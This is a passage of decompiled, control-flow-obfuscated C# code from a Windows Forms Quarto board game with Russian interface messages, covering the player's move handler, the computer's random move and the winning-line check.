					num = (int)((num2 * 753209554) ^ 0x2F857AC1);
					continue;
				case 13u:
					num6 = 0;
					num = 916222517;
					continue;
				case 12u:
					num = (int)((num2 * 332599275) ^ 0x75E5467);
					continue;
				case 11u:
					num5++;
					num = ((int)num2 * -1890775764) ^ 0x6BD1F3F9;
					continue;
				case 10u:
					num4 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1103945580) ^ 0x1AB153BC;
						continue;
					}
					num13 = 0;
					goto IL_01e8;
				case 9u:
					num13 = ((board[num4, num3] == null) ? 1 : 0);
					goto IL_01e8;
				case 8u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = -1489932256;
						num11 = -1489932256;
					}
					else
					{
						num10 = -1076260057;
						num11 = -1076260057;
					}
					num = num10 ^ ((int)num2 * -623959989);
					continue;
				}
				case 7u:
					num3 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1630966839) ^ 0x6762F542;
					continue;
				case 6u:
				{
					int num7;
					if (!(Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue))
					{
						num = 1398341709;
						num7 = 1398341709;
					}
					else
					{
						num = 54017170;
						num7 = 54017170;
					}
					continue;
				}
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -288822538) ^ -1709854412;
					continue;
				case 4u:
					flag = num6 < 4;
					num = 1065871629;
					continue;
				case 3u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 2132351384) ^ 0x16D17F30);
					continue;
				case 2u:
					num5 = 0;
					num = ((int)num2 * -1395008056) ^ 0x14F57071;
					continue;
				case 1u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1774559223) ^ -1261626158;
					continue;
				default:
					return;
				case 0u:
					break;
				case 15u:
					return;
					IL_01e8:
					flag2 = (byte)num13 != 0;
					num = 858415863;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_13e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1410: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		bool flag = Form1.smethod_46((Control)(object)pictureBox1);
		Figurine[,] array = default(Figurine[,]);
		int num8 = default(int);
		int num9 = default(int);
		int num22 = default(int);
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		int num27 = default(int);
		int num28 = default(int);
		int num31 = default(int);
		int num17 = default(int);
		int num33 = default(int);
		int num25 = default(int);
		int num5 = default(int);
		bool flag15 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag5 = default(bool);
		int num21 = default(int);
		int num23 = default(int);
		int num24 = default(int);
		bool flag11 = default(bool);
		int num34 = default(int);
		int num3 = default(int);
		bool flag13 = default(bool);
		int num26 = default(int);
		bool flag14 = default(bool);
		int num15 = default(int);
		int num16 = default(int);
		bool flag3 = default(bool);
		bool flag12 = default(bool);
		bool flag16 = default(bool);
		bool flag8 = default(bool);
		int num18 = default(int);
		bool flag10 = default(bool);
		bool flag7 = default(bool);
		bool flag4 = default(bool);
		int num42 = default(int);
		bool flag6 = default(bool);
		bool flag9 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1036040835;
			while (true)
			{
				uint num2;
				int num41;
				int num7;
				int num36;
				int num52;
				switch ((num2 = (uint)num ^ 0xAF1C2AE7u) % 165u)
				{
				case 164u:
				{
					int num10;
					if (array[num8, num9] != null)
					{
						num = -2145250168;
						num10 = -2145250168;
					}
					else
					{
						num = -550452302;
						num10 = -550452302;
					}
					continue;
				}
				case 163u:
					num = (int)((num2 * 2009239140) ^ 0x525BA4BC);
					continue;
				case 162u:
					num22 = num4;
					num = ((int)num2 * -1683532127) ^ 0x661C9611;
					continue;
				case 161u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num27, num28]), num31 * size + 4, num17 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1480762369) ^ -744083895;
					continue;
				case 159u:
					Paint_Board();
					num = (int)((num2 * 1263808791) ^ 0x76AEA2F4);
					continue;
				case 158u:
					num33 = 0;
					num = (int)((num2 * 2043824671) ^ 0x1CD11615);
					continue;
				case 157u:
				{
					int num60;
					if (num25 < 4)
					{
						num = -1878819365;
						num60 = -1878819365;
					}
					else
					{
						num = -800413834;
						num60 = -800413834;
					}
					continue;
				}
				case 156u:
					num = ((int)num2 * -901022819) ^ 0x2A35C45F;
					continue;
				case 155u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num31 + 0.05f) * (float)size, ((float)num17 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1934976809) ^ 0x761A0780);
					continue;
				case 154u:
					Form1.smethod_5((Control)(object)borderBox[num5, num4], Color.White);
					num = (int)(num2 * 522797676) ^ -1584391605;
					continue;
				case 153u:
					flag15 = Stop(array2);
					num = ((int)num2 * -1592846143) ^ -204016280;
					continue;
				case 152u:
					array3[num17, num31] = new Figurine(storage[num27, num28]);
					if (!Stop(array3))
					{
						num = ((int)num2 * -1228988904) ^ 0x16BEBC62;
						continue;
					}
					num41 = 1;
					goto IL_021b;
				case 151u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 954698419) ^ 0x988B556);
					continue;
				case 150u:
					num = ((int)num2 * -1607325151) ^ 0x3352D746;
					continue;
				case 149u:
					flag5 = false;
					num = (int)((num2 * 1524642929) ^ 0x228C5CA6);
					continue;
				case 148u:
					board[num21, num22] = new Figurine(storage[num23, num24]);
					storage[num23, num24] = null;
					num = (int)(num2 * 411962119) ^ -1330372635;
					continue;
				case 147u:
					num7 = ((!Standoff(board)) ? 1 : 0);
					goto IL_02be;
				case 146u:
				{
					int num65;
					int num66;
					if (flag15)
					{
						num65 = 661701551;
						num66 = 661701551;
					}
					else
					{
						num65 = 568453663;
						num66 = 568453663;
					}
					num = num65 ^ (int)(num2 * 2024480947);
					continue;
				}
				case 145u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 157912976) ^ -1142072986;
					continue;
				case 144u:
					num = ((int)num2 * -2045621618) ^ 0x17402686;
					continue;
				case 143u:
					num = ((int)num2 * -1355675425) ^ 0x41A78786;
					continue;
				case 142u:
				{
					int num56;
					int num57;
					if (!flag11)
					{
						num56 = -241951470;
						num57 = -241951470;
					}
					else
					{
						num56 = -1464741537;
						num57 = -1464741537;
					}
					num = num56 ^ ((int)num2 * -47057703);
					continue;
				}
				case 141u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num34 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1827933301) ^ 0x722640D9);
					continue;
				case 140u:
					flag13 = num33 < 4;
					num = -2053598547;
					continue;
				case 139u:
					num = ((int)num2 * -1268159892) ^ 0x749F1C82;
					continue;
				case 138u:
					num27 = 0;
					num = ((int)num2 * -1974023905) ^ 0x3D6B08B8;
					continue;
				case 137u:
					num27 = num26;
					num = ((int)num2 * -1144111410) ^ 0x4F621020;
					continue;
				case 136u:
					num = ((int)num2 * -1998696794) ^ 0x3FB9DB20;
					continue;
				case 135u:
					flag14 = num5 < 4;
					num = -1181941926;
					continue;
				case 134u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num27, num28]), num34 * size + 4, num3 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1841195132) ^ -1295651638;
					continue;
				case 133u:
				{
					int num49;
					int num50;
					if (flag14)
					{
						num49 = -953079408;
						num50 = -953079408;
					}
					else
					{
						num49 = -1652279453;
						num50 = -1652279453;
					}
					num = num49 ^ (int)(num2 * 493848135);
					continue;
				}
				case 132u:
				{
					int num45;
					int num46;
					if (!flag13)
					{
						num45 = 728628704;
						num46 = 728628704;
					}
					else
					{
						num45 = 2003245654;
						num46 = 2003245654;
					}
					num = num45 ^ ((int)num2 * -406840783);
					continue;
				}
				case 131u:
					step++;
					num = -975925254;
					continue;
				case 130u:
					if (num15 == num27)
					{
						num = ((int)num2 * -1860217324) ^ 0x20BEF8FD;
						continue;
					}
					num36 = 0;
					goto IL_051b;
				case 129u:
					Form1.smethod_20(pictureBox[num27, num28], (Image)null);
					num = ((int)num2 * -1700785048) ^ -11297473;
					continue;
				case 128u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -864701299) ^ 0x5C110417;
					continue;
				case 127u:
					num36 = ((num16 == num28) ? 1 : 0);
					goto IL_051b;
				case 126u:
					num15 = Form1.smethod_33(rnd, 4);
					num16 = Form1.smethod_33(rnd, 4);
					num = -2134711495;
					continue;
				case 125u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1101932371) ^ -976226974;
					continue;
				case 124u:
					num33++;
					num = ((int)num2 * -1703049458) ^ 0x74D47148;
					continue;
				case 123u:
					num = (int)((num2 * 1959705595) ^ 0x78C8B7E7);
					continue;
				case 122u:
					num = ((int)num2 * -1947800515) ^ -1396761960;
					continue;
				case 121u:
					num = (int)((num2 * 1655262382) ^ 0x31485292);
					continue;
				case 120u:
					num = ((int)num2 * -808143131) ^ 0x1C3F68D8;
					continue;
				case 119u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = 1116770712;
						num14 = 1116770712;
					}
					else
					{
						num13 = 170011065;
						num14 = 170011065;
					}
					num = num13 ^ (int)(num2 * 1933497714);
					continue;
				}
				case 118u:
					num9 = 0;
					num = -2025172936;
					continue;
				case 117u:
					num = (int)(num2 * 550859049) ^ -905477310;
					continue;
				case 115u:
				{
					int num67;
					int num68;
					if (Form1.smethod_41((Control)(object)borderBox[num26, num25]) == Color.Red)
					{
						num67 = -152822363;
						num68 = -152822363;
					}
					else
					{
						num67 = -490595671;
						num68 = -490595671;
					}
					num = num67 ^ (int)(num2 * 1923641143);
					continue;
				}
				case 114u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num17 = 0;
					num = (int)((num2 * 670835265) ^ 0x65EAADC9);
					continue;
				case 113u:
				{
					int num63;
					int num64;
					if (!flag12)
					{
						num63 = 2037871732;
						num64 = 2037871732;
					}
					else
					{
						num63 = 1847541413;
						num64 = 1847541413;
					}
					num = num63 ^ (int)(num2 * 1406807899);
					continue;
				}
				case 112u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 661991179) ^ 0x6F9AFE1F);
					continue;
				case 111u:
					num = ((int)num2 * -1165145401) ^ -194933977;
					continue;
				case 110u:
				{
					int num61;
					int num62;
					if (!flag16)
					{
						num61 = -1697227767;
						num62 = -1697227767;
					}
					else
					{
						num61 = -1740626131;
						num62 = -1740626131;
					}
					num = num61 ^ ((int)num2 * -517675289);
					continue;
				}
				case 109u:
				{
					int num58;
					int num59;
					if (!flag8)
					{
						num58 = 1047288738;
						num59 = 1047288738;
					}
					else
					{
						num58 = 1378160511;
						num59 = 1378160511;
					}
					num = num58 ^ ((int)num2 * -1082853388);
					continue;
				}
				case 108u:
					num = ((int)num2 * -1339325386) ^ -1275469889;
					continue;
				case 107u:
				{
					int num55;
					if (num31 < 4)
					{
						num = -2115899196;
						num55 = -2115899196;
					}
					else
					{
						num = -895085706;
						num55 = -895085706;
					}
					continue;
				}
				case 106u:
					num41 = (Standoff(array3) ? 1 : 0);
					goto IL_021b;
				case 105u:
					num52 = ((num18 < 9) ? 1 : 0);
					goto IL_07ce;
				case 104u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -454267500) ^ 0x52FAD919;
					continue;
				case 103u:
					Form1.smethod_30((Control)(object)borderBox[num27, num28]);
					num = ((int)num2 * -899661247) ^ -1393488747;
					continue;
				case 102u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -1989803428) ^ -688874176;
					continue;
				case 101u:
					num = (int)(num2 * 863372709) ^ -1436764556;
					continue;
				case 100u:
				{
					int num53;
					int num54;
					if (!flag10)
					{
						num53 = -221220955;
						num54 = -221220955;
					}
					else
					{
						num53 = -338037827;
						num54 = -338037827;
					}
					num = num53 ^ (int)(num2 * 260430717);
					continue;
				}
				case 99u:
					num5++;
					num = ((int)num2 * -1362565212) ^ 0x50B5BA39;
					continue;
				case 98u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1162725412) ^ -467953415;
					continue;
				case 97u:
					num = ((int)num2 * -1134915975) ^ -1012056767;
					continue;
				case 96u:
					num34 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1601180550) ^ -739496059;
					continue;
				case 95u:
					num4++;
					num = -342509645;
					continue;
				case 94u:
					num = (int)(num2 * 1283441091) ^ -1498846314;
					continue;
				case 93u:
					num = ((int)num2 * -288913588) ^ -1416637759;
					continue;
				case 92u:
					num28 = 0;
					num = ((int)num2 * -552109796) ^ 0x2E77FBAC;
					continue;
				case 91u:
					num = (int)(num2 * 338117201) ^ -86159545;
					continue;
				case 90u:
					flag7 = board[num3, num34] != null;
					num = (int)((num2 * 295374922) ^ 0x2300266C);
					continue;
				case 89u:
					num = (int)(num2 * 760303505) ^ -1393256212;
					continue;
				case 88u:
					Form1.smethod_5((Control)(object)borderBox[num26, num25], Color.LimeGreen);
					num = (int)(num2 * 796143376) ^ -1836380436;
					continue;
				case 87u:
					num = ((int)num2 * -1177705541) ^ -291723106;
					continue;
				case 86u:
					num = (int)(num2 * 184619716) ^ -2081867318;
					continue;
				case 85u:
					num = ((int)num2 * -1288601890) ^ 0x571123C1;
					continue;
				case 84u:
					num23 = num5;
					num24 = num4;
					num = (int)((num2 * 816056141) ^ 0x2CD80F4F);
					continue;
				case 83u:
					num25 = 0;
					num = -995021208;
					continue;
				case 82u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num4]);
					num = ((int)num2 * -90723866) ^ -504618103;
					continue;
				case 81u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1725288001) ^ 0x73085CDA;
					continue;
				case 80u:
					num = ((int)num2 * -718749363) ^ -1280096884;
					continue;
				case 79u:
					if (!flag5)
					{
						num = (int)(num2 * 1224618843) ^ -401742829;
						continue;
					}
					num52 = 1;
					goto IL_07ce;
				case 78u:
					num28 = num25;
					num = ((int)num2 * -975814730) ^ -2141240006;
					continue;
				case 77u:
					if (storage[num15, num16] != null)
					{
						num = (int)(num2 * 1053981365) ^ -451291200;
						continue;
					}
					num36 = 1;
					goto IL_051b;
				case 76u:
					Form1.smethod_15(timer1);
					num = -2118005488;
					continue;
				case 75u:
					num21 = 0;
					num22 = 0;
					num5 = 0;
					num = (int)(num2 * 1594125033) ^ -1500840245;
					continue;
				case 74u:
					num23 = 0;
					num24 = 0;
					num = (int)((num2 * 773970176) ^ 0x492B74E1);
					continue;
				case 73u:
					Form1.smethod_30((Control)(object)pictureBox[num27, num28]);
					num = ((int)num2 * -988084622) ^ -1882804878;
					continue;
				case 72u:
				{
					int num51;
					if (board[num17, num31] == null)
					{
						num = -1415639933;
						num51 = -1415639933;
					}
					else
					{
						num = -162648654;
						num51 = -162648654;
					}
					continue;
				}
				case 71u:
					flag4 = num4 < 4;
					num = -1629474313;
					continue;
				case 70u:
					Form1.smethod_30((Control)(object)borderBox[num5, num4]);
					Form1.smethod_20(pictureBox[num5, num4], (Image)null);
					num = ((int)num2 * -420545275) ^ 0x4AF4E565;
					continue;
				case 69u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1760012944) ^ -1206084837;
					continue;
				case 68u:
					num31++;
					num = -1823647240;
					continue;
				case 67u:
					num = -2145250168;
					continue;
				case 66u:
					board[num3, num34] = new Figurine(storage[num27, num28]);
					storage[num27, num28] = null;
					num = ((int)num2 * -1889222998) ^ 0x35A5872A;
					continue;
				case 65u:
					num = ((int)num2 * -639032925) ^ 0x6659944E;
					continue;
				case 64u:
					num42++;
					num = (int)(num2 * 1059042093) ^ -1792720498;
					continue;
				case 63u:
					num = (int)(num2 * 1775690216) ^ -1159207716;
					continue;
				case 62u:
				{
					int num47;
					int num48;
					if (!flag6)
					{
						num47 = 1409119734;
						num48 = 1409119734;
					}
					else
					{
						num47 = 1905415661;
						num48 = 1905415661;
					}
					num = num47 ^ ((int)num2 * -1590652495);
					continue;
				}
				case 61u:
				{
					int num43;
					int num44;
					if (Form1.smethod_41((Control)(object)borderBox[num5, num4]) == Color.Blue)
					{
						num43 = -1230556706;
						num44 = -1230556706;
					}
					else
					{
						num43 = -122580521;
						num44 = -122580521;
					}
					num = num43 ^ (int)(num2 * 1745121212);
					continue;
				}
				case 60u:
					flag11 = num42 < 4;
					num = -1825740098;
					continue;
				case 59u:
					Form1.smethod_7((Control)(object)pictureBox[num33, num42], bool_0: true);
					num = -431751655;
					continue;
				case 58u:
					num26 = 0;
					num = (int)(num2 * 1838856375) ^ -1746507827;
					continue;
				case 57u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -10903324) ^ -1935499273;
					continue;
				case 56u:
					num42 = 0;
					num = -1582478552;
					continue;
				case 55u:
					num = -162648654;
					continue;
				case 54u:
					flag9 = num9 < 4;
					num = -255261352;
					continue;
				case 53u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					num = (int)((num2 * 332406140) ^ 0x6C8B51F5);
					continue;
				case 52u:
					flag10 = num26 < 4;
					num = -500734900;
					continue;
				case 51u:
				{
					int num39;
					int num40;
					if (flag9)
					{
						num39 = -661184932;
						num40 = -661184932;
					}
					else
					{
						num39 = -1409293771;
						num40 = -1409293771;
					}
					num = num39 ^ ((int)num2 * -904895680);
					continue;
				}
				case 50u:
					num = ((int)num2 * -1313860425) ^ -424940163;
					continue;
				case 49u:
				{
					int num37;
					int num38;
					if (!flag)
					{
						num37 = -1893417458;
						num38 = -1893417458;
					}
					else
					{
						num37 = -1354365185;
						num38 = -1354365185;
					}
					num = num37 ^ ((int)num2 * -1906337634);
					continue;
				}
				case 48u:
					Form1.smethod_5((Control)(object)borderBox[num15, num16], Color.Blue);
					num = ((int)num2 * -1334473293) ^ -1161124867;
					continue;
				case 47u:
					Form1.smethod_5((Control)(object)borderBox[num27, num28], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num27, num28]);
					Form1.smethod_20(pictureBox[num27, num28], (Image)null);
					num = ((int)num2 * -1673090328) ^ -1211379348;
					continue;
				case 46u:
					num = -8723900;
					continue;
				case 45u:
					if (!Stop(board))
					{
						num = (int)((num2 * 1467525044) ^ 0x112EB46F);
						continue;
					}
					num7 = 0;
					goto IL_02be;
				case 44u:
					num = ((int)num2 * -932582714) ^ 0x26BAF53A;
					continue;
				case 43u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 874776516) ^ -1409757262;
					continue;
				case 42u:
				{
					int num35;
					if (num8 < 4)
					{
						num = -869685801;
						num35 = -869685801;
					}
					else
					{
						num = -601405406;
						num35 = -601405406;
					}
					continue;
				}
				case 41u:
					num8++;
					num = (int)(num2 * 1404749932) ^ -75997659;
					continue;
				case 40u:
					num = ((int)num2 * -1017154293) ^ -1577195874;
					continue;
				case 39u:
					Form1.smethod_30((Control)(object)pictureBox[num27, num28]);
					num = ((int)num2 * -833894509) ^ 0x493188CF;
					continue;
				case 38u:
					num = (int)((num2 * 433099556) ^ 0x380483B0);
					continue;
				case 37u:
					num = -1071628499;
					continue;
				case 36u:
					num18++;
					num = -1212961165;
					continue;
				case 35u:
					Form1.smethod_7((Control)(object)pictureBox[num26, num25], bool_0: false);
					num = (int)((num2 * 485793433) ^ 0x7275D397);
					continue;
				case 34u:
					array[num3, num34] = new Figurine(storage[num27, num28]);
					num8 = 0;
					num = (int)(num2 * 1091223395) ^ -780384274;
					continue;
				case 33u:
				{
					int num32;
					if (!Standoff(board))
					{
						num = -1419195495;
						num32 = -1419195495;
					}
					else
					{
						num = -346521420;
						num32 = -346521420;
					}
					continue;
				}
				case 32u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 991386908) ^ 0x33FD6FBA);
					continue;
				case 31u:
					flag5 = true;
					num = ((int)num2 * -515904632) ^ -1544243836;
					continue;
				case 30u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					num = (int)((num2 * 1681949976) ^ 0x1DD988C0);
					continue;
				case 29u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1289078466) ^ 0x11550B6);
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)borderBox[num26, num25]);
					num = (int)((num2 * 1969532093) ^ 0x5434735A);
					continue;
				case 27u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1866588853) ^ -442881553;
					continue;
				case 26u:
					num31 = 0;
					num = -381729523;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -2066621938;
					continue;
				case 24u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = ((int)num2 * -58927428) ^ 0x55C30BE1;
					continue;
				case 23u:
					board[num17, num31] = new Figurine(storage[num27, num28]);
					storage[num27, num28] = null;
					flag8 = Standoff(board);
					num = ((int)num2 * -1423256125) ^ 0x6AD09C7C;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)borderBox[num15, num16]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -194642773) ^ -1512551761;
					continue;
				case 21u:
				{
					int num29;
					int num30;
					if (!flag7)
					{
						num29 = -818703362;
						num30 = -818703362;
					}
					else
					{
						num29 = -1954608657;
						num30 = -1954608657;
					}
					num = num29 ^ (int)(num2 * 1454895867);
					continue;
				}
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num27, num28], Color.White);
					num = ((int)num2 * -1103987151) ^ -874934157;
					continue;
				case 19u:
					num26++;
					num = ((int)num2 * -1137053092) ^ 0x19B3DAC7;
					continue;
				case 18u:
					flag6 = num17 < 4;
					num = -262839651;
					continue;
				case 17u:
					num = -472420307;
					continue;
				case 16u:
					num21 = num5;
					num = (int)((num2 * 619973470) ^ 0x34045DFD);
					continue;
				case 15u:
					num25++;
					num = -995021208;
					continue;
				case 14u:
				{
					int num19;
					int num20;
					if (!flag4)
					{
						num19 = -1020392338;
						num20 = -1020392338;
					}
					else
					{
						num19 = -1180134761;
						num20 = -1180134761;
					}
					num = num19 ^ ((int)num2 * -567424945);
					continue;
				}
				case 13u:
					num18 = 0;
					num = (int)(num2 * 602859323) ^ -1064456347;
					continue;
				case 12u:
					num9++;
					num = -101617026;
					continue;
				case 11u:
					num4 = 0;
					num = -425715912;
					continue;
				case 10u:
					num = ((int)num2 * -869273992) ^ 0x3D04E458;
					continue;
				case 9u:
					num17++;
					num = (int)((num2 * 80727836) ^ 0x492D262B);
					continue;
				case 8u:
					num = (int)(num2 * 2120360746) ^ -1852513600;
					continue;
				case 7u:
					array2[num8, num9] = new Figurine(storage[num15, num16]);
					num = ((int)num2 * -170728559) ^ -2112576045;
					continue;
				case 6u:
					num = -951330756;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 2084412590) ^ -1171885252;
					continue;
				case 4u:
					num = ((int)num2 * -616775291) ^ -259191189;
					continue;
				case 3u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = -714634263;
						num12 = -714634263;
					}
					else
					{
						num11 = -1088229482;
						num12 = -1088229482;
					}
					num = num11 ^ (int)(num2 * 169549360);
					continue;
				}
				case 2u:
				{
					int num6;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num5 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = -704643246;
						num6 = -704643246;
					}
					else
					{
						num = -142793878;
						num6 = -142793878;
					}
					continue;
				}
				case 1u:
					num3 = Form1.smethod_33(rnd, 4);
					num = -723427451;
					continue;
				case 0u:
					num = ((int)num2 * -1030443583) ^ 0x49EDD892;
					continue;
				default:
					return;
				case 160u:
					break;
				case 116u:
					return;
					IL_02be:
					flag2 = (byte)num7 != 0;
					num = -746140278;
					continue;
					IL_051b:
					flag3 = (byte)num36 != 0;
					num = -1285228814;
					continue;
					IL_021b:
					flag12 = (byte)num41 != 0;
					num = -1144213212;
					continue;
					IL_07ce:
					flag16 = (byte)num52 != 0;
					num = -1175830224;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num8 = default(int);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -71288284;
			while (true)
			{
				uint num2;
				int num31;
				int num7;
				switch ((num2 = (uint)num ^ 0xE9078B2Du) % 78u)
				{
				case 77u:
				{
					int num60;
					int num61;
					if (mem[num8, 1].Square == mem[num8, 2].Square)
					{
						num60 = -1556537136;
						num61 = -1556537136;
					}
					else
					{
						num60 = -1929186696;
						num61 = -1929186696;
					}
					num = num60 ^ ((int)num2 * -42598535);
					continue;
				}
				case 76u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1353126427) ^ 0x378F53CD;
						continue;
					}
					goto IL_0076;
				case 75u:
					if (mem[0, 3] != null)
					{
						num = -892742688;
						continue;
					}
					goto IL_0097;
				case 74u:
				{
					int num51;
					int num52;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num51 = -1217963576;
						num52 = -1217963576;
					}
					else
					{
						num51 = -842545281;
						num52 = -842545281;
					}
					num = num51 ^ ((int)num2 * -673165392);
					continue;
				}
				case 73u:
				{
					int num68;
					int num69;
					if (mem[3, 3] != null)
					{
						num68 = -1188324710;
						num69 = -1188324710;
					}
					else
					{
						num68 = -1716353529;
						num69 = -1716353529;
					}
					num = num68 ^ ((int)num2 * -1085543923);
					continue;
				}
				case 72u:
				{
					int num46;
					int num47;
					if (!flag4)
					{
						num46 = -968857586;
						num47 = -968857586;
					}
					else
					{
						num46 = -1362944254;
						num47 = -1362944254;
					}
					num = num46 ^ (int)(num2 * 1462425140);
					continue;
				}
				case 71u:
				{
					int num23;
					int num24;
					if (mem[num8, 3] != null)
					{
						num23 = -1045675169;
						num24 = -1045675169;
					}
					else
					{
						num23 = -1090228500;
						num24 = -1090228500;
					}
					num = num23 ^ (int)(num2 * 956700635);
					continue;
				}
				case 70u:
					if (mem[1, num8].Square == mem[2, num8].Square)
					{
						num = ((int)num2 * -1987093287) ^ 0x4147DCAD;
						continue;
					}
					goto IL_0190;
				case 69u:
					if (mem[2, num8] != null)
					{
						num = (int)(num2 * 1766345238) ^ -1507552534;
						continue;
					}
					goto IL_01b9;
				case 68u:
				{
					int num44;
					int num45;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num44 = -523012594;
						num45 = -523012594;
					}
					else
					{
						num44 = -2037004726;
						num45 = -2037004726;
					}
					num = num44 ^ ((int)num2 * -436212614);
					continue;
				}
				case 67u:
				{
					int num33;
					int num34;
					if (mem[1, num8].Big != mem[2, num8].Big)
					{
						num33 = 1636658765;
						num34 = 1636658765;
					}
					else
					{
						num33 = 1270222615;
						num34 = 1270222615;
					}
					num = num33 ^ ((int)num2 * -346910934);
					continue;
				}
				case 66u:
				{
					int num27;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -622973148;
						num27 = -622973148;
					}
					else
					{
						num = -1374907682;
						num27 = -1374907682;
					}
					continue;
				}
				case 65u:
				{
					int num16;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = -1036772843;
						num16 = -1036772843;
					}
					else
					{
						num = -816543521;
						num16 = -816543521;
					}
					continue;
				}
				case 64u:
					num8++;
					num = ((int)num2 * -498881213) ^ -1913565270;
					continue;
				case 63u:
				{
					int num66;
					int num67;
					if (mem[1, 1] == null)
					{
						num66 = -1344057965;
						num67 = -1344057965;
					}
					else
					{
						num66 = -1844279320;
						num67 = -1844279320;
					}
					num = num66 ^ (int)(num2 * 1721642555);
					continue;
				}
				case 62u:
				{
					int num58;
					int num59;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num58 = -1495100080;
						num59 = -1495100080;
					}
					else
					{
						num58 = -632610156;
						num59 = -632610156;
					}
					num = num58 ^ ((int)num2 * -1384131121);
					continue;
				}
				case 61u:
				{
					int num50;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -1807949129;
						num50 = -1807949129;
					}
					else
					{
						num = -49895662;
						num50 = -49895662;
					}
					continue;
				}
				case 60u:
				{
					int num40;
					int num41;
					if (mem[1, num8].Dark == mem[2, num8].Dark)
					{
						num40 = 64456832;
						num41 = 64456832;
					}
					else
					{
						num40 = 374282070;
						num41 = 374282070;
					}
					num = num40 ^ (int)(num2 * 581393348);
					continue;
				}
				case 58u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -756190251) ^ 0x14C486E3;
						continue;
					}
					goto IL_03dd;
